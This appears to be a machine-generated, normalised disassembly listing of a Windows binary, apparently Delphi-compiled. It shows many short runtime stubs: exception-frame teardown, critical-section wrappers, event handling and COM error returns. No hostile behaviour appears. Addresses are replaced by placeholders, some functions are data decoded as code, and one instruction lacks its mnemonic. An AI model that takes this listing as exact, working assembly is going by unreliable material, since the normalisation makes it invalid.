sub_410d54
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40ec50
pop esi
pop ebx
retn
sub_410ed6
jmp sub_4039c0
sub_410edd
pop ebp
retn
sub_410ee0
sub [ rw-data ] 0x1
retn
sub_410f0d
jmp sub_4039c0
sub_410f14
pop ebp
retn
sub_410f18
sub [ rw-data ] 0x1
retn
sub_4117cd
jmp [ ecx + eax * 2 ]
sub_412203
add [ esp + 0x4 ] 0xffffffd8
jmp sub_419b50
sub_41220d
add [ esp + 0x4 ] 0xffffffd8
jmp sub_419b70
sub_412217
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_412584
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_4126a8
mov eax [ eax + 0xc ]
call sub_41386c
retn
sub_41297f
jmp sub_4039c0
sub_412986
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41298c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_413a24
test eax eax
setge al
pop esi
pop ebx
retn
sub_412c8f
jmp sub_4039c0
sub_412c96
mov esp ebp
pop ebp
retn
sub_412d64
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_412d70
push ebx
mov ebx edx
mov edx ebx
call sub_412b84
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_4128e4
sub_412e1c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_412f77
jmp sub_4039c0
sub_41304b
jmp sub_4039c0
sub_41305c
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_4130c8
jmp sub_4039c0
sub_4130cf
pop ebx
mov esp ebp
pop ebp
retn
sub_41311a
jmp sub_4039c0
sub_413121
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_4131ad
jmp sub_4039c0
sub_4131b4
pop ebx
pop ebp
retn
sub_4131fa
jmp sub_4039c0
sub_413201
pop ebx
pop ebp
retn
sub_413246
jmp sub_4039c0
sub_41324d
pop ebx
pop ebp
retn
sub_413297
jmp sub_4039c0
sub_41329e
pop esi
pop ebx
pop ebp
retn
sub_4132f2
jmp sub_4039c0
sub_4132f9
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_413426
jmp sub_4039c0
sub_4134fc
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_413b0c
sub_4135ec
jmp sub_4039c0
sub_413776
jmp sub_4039c0
sub_41377d
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413817
jmp sub_4039c0
sub_41381e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41383d
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_413836
jmp sub_4039c0
sub_41383d
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_4138a0
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_413b68
xor edx edx
mov eax ebx
call sub_413b2c
pop ebx
retn
sub_413918
mov eax [ ebp + 0x4 ]
retn
sub_41394e
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41399c
jmp sub_4039c0
sub_4139a3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4139a8
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_4139c0
xor edx edx
call sub_4139c8
retn
sub_413ab0
mov edx [ eax + 0x8 ]
dec edx
call sub_4139c8
retn
sub_413bd8
retn
sub_413c92
jmp sub_4039c0
sub_413c99
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035e0
sub_413d28
jmp sub_4039c0
sub_413d2f
pop ebx
pop ecx
pop ebp
retn
sub_413d34
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_413d8b
jmp sub_4039c0
sub_413d92
pop ebx
pop ecx
pop ebp
retn
sub_413d98
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_413dd4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
retn
sub_413dec
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_413ec7
retn
sub_413ec8
cmp edx [ eax + 0x4 ]
jae sub_413dd4
mov eax [ eax + 0x8 ]
bt [ eax ] edx
sbb eax eax
and eax 0x1
retn
sub_413f84
test edx edx
je r-xdata
xor edx edx
call sub_413f98
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_41404e
jmp sub_4039c0
sub_414055
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414068
xchg edx eax
call sub_413f98
retn
sub_414070
retn
sub_414109
jmp sub_4039c0
sub_414110
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41425a
jmp sub_4039c0
sub_41436a
jmp sub_4039c0
sub_414371
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41438e
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
sub_414387
jmp sub_4039c0
sub_41438e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414418
jmp sub_4039c0
sub_414430
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_4144ec
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_414595
jmp sub_4039c0
sub_41459c
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4145a8
mov eax [ ebp + 0x4 ]
retn
sub_4145de
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41462c
jmp sub_4039c0
sub_414633
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4146f2
jmp sub_4039c0
sub_4146f9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41471b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fe0
retn
sub_414714
jmp sub_4039c0
sub_41471b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414724
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_41472c
xor eax eax
retn
sub_414775
jmp sub_4039c0
sub_41477c
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41488f
jmp sub_4039c0
sub_414896
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414924
jmp sub_4039c0
sub_41492b
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4149fb
jmp sub_4039c0
sub_414a02
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414ab8
jmp sub_4039c0
sub_414abf
pop esi
pop ecx
pop ebp
retn
sub_414b44
jmp sub_4039c0
sub_414b4b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b68
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
sub_414b61
jmp sub_4039c0
sub_414b68
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414bf4
jmp sub_4039c0
sub_414c11
jmp sub_4039c0
sub_414c18
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414c54
retn
sub_414cd7
jmp sub_4039c0
sub_414cde
mov eax [ ebp - 0x8 ]
call sub_417818
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d03
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
sub_414cfc
jmp sub_4039c0
sub_414d03
mov esp ebp
pop ebp
retn
sub_414d53
jmp sub_4039c0
sub_414d5a
pop esi
pop ecx
pop ebp
retn
sub_414dad
jmp sub_4039c0
sub_414db4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414dbc
retn
sub_414e37
jmp sub_4039c0
sub_414e3e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414edb
jmp sub_4039c0
sub_414ee2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414eff
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
sub_414ef8
jmp sub_4039c0
sub_414eff
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414f04
retn
sub_414f7e
jmp sub_4039c0
sub_414f85
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414f8c
mov eax edx
mov edx ecx
call sub_407d2c
retn
sub_414f98
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_414fb0
sub_415028
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_415098
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_4150b4
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_4152a8
mov eax [ eax + 0x18 ]
retn
sub_4152ac
mov eax [ eax + 0x14 ]
retn
sub_415348
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_415554
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_4026fc
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_415590
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_4155a8
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_4155bc
mov edx sub_4155a8
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_415604
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407d2c
retn
mov eax edx
mov edx ecx
call sub_407cf4
retn
sub_4156a0
retn
sub_415998
jmp sub_4039c0
sub_41599f
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_415a00
jmp sub_4039c0
sub_415a07
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415a4c
mov eax [ eax + 0x4 ]
call sub_408284
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_415a5c
mov eax [ eax + 0x4 ]
call sub_4082b0
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_415a98
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_415c41
jmp sub_4039c0
sub_415ca0
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_415d30
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_415d80
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_415f6b
jmp sub_4039c0
sub_415f72
mov esp ebp
pop ebp
retn
sub_41601c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
retn
sub_4160a4
mov [ eax + 0x18 ] edx
retn
sub_416220
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_4108cc
retn
sub_4162a7
jmp sub_4039c0
sub_4162ae
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41635a
jmp sub_4039c0
sub_416361
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_416505
jmp sub_4039c0
sub_416557
jmp sub_4039c0
sub_416576
jmp sub_4039c0
sub_41657d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41659c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_416595
jmp sub_4039c0
sub_41659c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41663f
jmp sub_4039c0
sub_4166c7
jmp sub_4039c0
sub_4166d4
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
pop ebx
retn
sub_4166ec
mov eax [ rw-data ]
call sub_4166d4
retn
sub_416724
push ebx
call sub_410784
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_4166ec
sub_416891
jmp sub_4039c0
sub_416898
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403fbc
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_4169b8
jmp sub_4039c0
sub_4169bf
pop edi
pop esi
pop ebx
pop ebp
retn
sub_416ab6
jmp sub_4039c0
sub_416ad3
jmp sub_4039c0
sub_416ada
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416bd8
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_415620
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_416c9c
push ebx
mov ebx eax
mov eax ebx
call sub_418650
cmp al 0x9
sete al
pop ebx
retn
sub_416cfb
jmp sub_4039c0
sub_416d02
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_416da8
jmp sub_4039c0
sub_416daf
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41702e
jmp sub_40370c
sub_41705a
jmp sub_40370c
sub_4170fc
jmp sub_40370c
sub_41719f
jmp sub_40370c
sub_417377
jmp sub_40370c
sub_4173b9
jmp sub_4039c0
sub_4173e9
jmp sub_4039c0
sub_4173f0
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41745f
jmp sub_4039c0
sub_417536
jmp sub_4039c0
sub_41753d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417810
mov dl 0x1
call sub_416778
retn
sub_417948
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_417951
jmp sub_4039c0
j_sub_417948
jmp sub_417948
sub_417958
pop ebx
mov esp ebp
pop ebp
retn
sub_417960
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_418760
mov eax [ rw-data ]
call sub_4166d4
pop ebp
retn
j_sub_403838
jmp sub_403838
j_sub_403838#2
jmp sub_403838
sub_417b4c
jmp sub_4039c0
sub_417b53
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417c33
jmp sub_4039c0
sub_417c3a
mov esp ebp
pop ebp
retn
sub_417cf2
jmp sub_4039c0
sub_417cf9
pop ecx
pop ecx
pop ebp
retn
sub_417ffb
jmp sub_4039c0
sub_418002
pop ebx
mov esp ebp
pop ebp
retn
sub_4182a7
jmp sub_4039c0
sub_4182ae
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_40326c
retn
sub_4182c7
jmp sub_4039c0
sub_4182eb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_40370c
sub_418322
jmp sub_40370c
sub_418361
jmp sub_4039c0
sub_418368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41838a
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403fe0
retn
sub_418383
jmp sub_4039c0
sub_41838a
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418411
jmp sub_40370c
sub_41843e
jmp sub_4039c0
sub_418445
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418450
push ecx
mov edx esp
mov ecx 0x4
call sub_416c14
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_4166d4
sub_41855d
jmp sub_4039c0
sub_418564
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418643
jmp sub_4039c0
sub_41864a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4186a0
jmp sub_4039c0
sub_4186a7
pop ebx
pop ecx
pop ebp
retn
sub_4188ef
jmp sub_4039c0
sub_4188f6
pop ecx
pop ecx
pop ebp
retn
sub_418939
jmp sub_4039c0
sub_418940
pop ebx
pop ecx
pop ebp
retn
sub_4189dc
jmp sub_4039c0
sub_4189e3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418a91
jmp sub_4039c0
sub_418a98
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418aa4
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_418cff
jmp sub_4039c0
sub_418d06
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d2b
mov eax [ ebp - 0x8 ]
call sub_40326c
mov eax [ ebp - 0x4 ]
call sub_40326c
retn
sub_418d24
jmp sub_4039c0
sub_418d2b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d50
lea eax [ ebp - 0x1c ]
call sub_405628
lea eax [ ebp - 0x18 ]
call sub_403fbc
retn
sub_418d49
jmp sub_4039c0
sub_418d50
pop ebx
mov esp ebp
pop ebp
retn
sub_418f62
jmp sub_4039c0
sub_418f69
pop ebx
mov esp ebp
pop ebp
retn
sub_418fbc
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_415884
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_418fd4
test dl dl
je r-xdata
mov dl 0x8
call sub_419158
retn
mov dl 0x9
call sub_419158
retn
sub_41905c
mov dl 0x1
call sub_419158
retn
sub_419064
xor edx edx
call sub_419158
retn
sub_419149
jmp sub_4039c0
sub_419150
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41916c
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40c824
sub_4191a0
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_4191b8
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_4191c4
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_4191b8
sub_4192ea
jmp sub_40370c
sub_419319
jmp sub_4039c0
sub_41934f
jmp sub_4039c0
sub_419356
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419375
push rw-data
call LeaveCriticalSection
retn
sub_41936e
jmp sub_4039c0
sub_419375
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419444
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_419620
sub_4194a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417760
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_4194b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417760
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_4194cc
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_418fe8
retn
sub_4194d8
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_418fe8
retn
sub_419780
xor eax eax
retn
sub_419784
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41978c
xor eax eax
retn
sub_419790
retn
sub_419794
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404010
pop esi
pop ebx
retn
sub_4197a8
mov eax [ eax + 0x4 ]
retn
sub_4197ac
retn
sub_4197b0
xor eax eax
retn
sub_4197b4
retn
sub_4197b8
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_4197c4
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_4197d0
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_4197dc
retn
sub_4197e0
xchg edx eax
call sub_417404
retn
sub_4197e8
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_419870
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403468
pop esi
retn
sub_419884
retn
sub_419964
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_404010
pop esi
pop ebx
retn
sub_4199a4
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_419af0
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_4034b4
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_419b08
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_419b90
retn
sub_419bd8
retn
sub_419c10
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_419c28
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_419e4c
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403468
pop esi
pop ebx
retn
sub_419c70
mov al 0x1
retn
sub_419c74
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_419c7c
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_419d24
xor eax eax
retn
sub_419d28
retn
sub_419d54
retn
sub_419dec
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_419e00
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_41386c
retn
sub_419f47
jmp sub_40370c
sub_419f4c
mov ebx 0x1
call sub_403a74
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_419faf
jmp sub_40370c
sub_419fb4
mov ebx 0x80030103
call sub_403a74
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a032
jmp sub_40370c
sub_41a037
mov ebx 0x80030009
call sub_403a74
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_41a095
jmp sub_40370c
sub_41a09a
mov ebx 0x8000ffff
call sub_403a74
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a265
jmp sub_4039c0
sub_41a276
jmp sub_40370c
sub_41a27b
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a2a4
lea eax [ ebp + 0xc ]
call sub_405628
retn
sub_41a29d
jmp sub_4039c0
sub_41a2a4
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41a2b0
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41a2bc
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_41a2c8
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41a2d4
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41a343
jmp sub_40370c
sub_41a348
mov esi 0x8000ffff
call sub_403a74
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a35c
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_41a3c9
jmp sub_4039c0
sub_41a3d0
mov eax [ rw-data ]
call sub_40326c
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41a3e0
call sub_4131b8
retn
sub_41a4a8
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_41a64c
jmp sub_4039c0
sub_41a653
pop ebp
retn
sub_41a6e1
jmp sub_4039c0
sub_41a6e8
pop ebp
retn
sub_41a9e9
jmp sub_4039c0
sub_41a9f0
pop ebp
retn
sub_41a9f4
sub [ rw-data ] 0x1
retn
sub_41b21b
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] 0x0
int3
sub_41b28f
add [ esp + 0x4 ] 0xffffffdc
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_41b3d9
add eax 0xffffffd8
jmp sub_41f704
sub_41b3e1
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_41b904
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_41b978
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_41b9ec
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41b9f8
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41bad8
jmp sub_4039c0
sub_41badf
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41bb6f
jmp sub_4039c0
sub_41bc01
jmp sub_4039c0
sub_41bc08
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41bc6c
jmp sub_4039c0
sub_41bc73
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41bcdb
jmp sub_4039c0
sub_41bce2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41bd85
jmp sub_4039c0
sub_41bd8c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c1e4
push 0x33
mov ecx rw-data
call sub_413478
retn
sub_41c1f4
push 0x33
mov ecx rw-data
call sub_413438
retn
sub_41c204
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41c228
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_41c3fc
push 0x11
mov ecx rw-data
call sub_413438
retn
sub_41c53c
push ebx
mov ebx eax
mov eax ebx
call sub_41c204
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41c5f6
jmp sub_4039c0
sub_41c5fd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c228
retn
sub_41c613
jmp sub_4039c0
sub_41c62c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41c689
jmp sub_4039c0
sub_41c690
pop ebx
pop ecx
pop ebp
retn
sub_41c809
jmp sub_4039c0
sub_41c831
jmp sub_4039c0
sub_41c838
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41c8a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_404220
pop esi
pop ebx
retn
sub_41c918
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_41c874
push eax
call MulDiv
neg eax
pop ebx
retn
sub_41c954
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_41c98c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_41c9bc
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_41cada
jmp sub_4039c0
sub_41cae1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
